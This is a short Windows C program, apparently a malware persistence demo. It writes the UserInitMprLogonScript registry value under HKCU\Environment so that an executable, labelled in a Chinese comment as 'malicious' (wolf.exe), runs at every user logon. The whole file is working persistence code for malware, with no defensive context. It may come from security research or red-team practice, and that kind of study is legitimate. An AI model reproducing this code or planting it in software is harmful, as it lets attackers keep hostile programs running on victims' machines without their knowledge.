#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  const char* env = "Environment";

  //恶意可执行程序
  const char* exe = "C:\\Users\\Administrator\\Desktop\\test\\malicious\\pre\\wolf.exe";

  LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)env, 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    RegSetValueEx(hkey, (LPCSTR)"UserInitMprLogonScript", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }

  return 0;
}
